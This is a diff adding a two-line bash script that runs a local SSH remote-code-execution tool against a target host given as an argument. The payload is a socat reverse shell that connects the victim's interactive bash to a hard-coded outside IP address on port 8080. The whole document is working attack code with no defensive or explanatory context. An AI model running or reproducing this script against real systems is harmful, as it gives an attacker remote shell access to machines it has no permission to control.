@@ -1,0 +1,2 @@
+#!/bin/bash
+/home/nirvana/SSH-Remote-Code-Execution/ssh.py 1 7 $1 22 "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:51.75.120.176:8080"
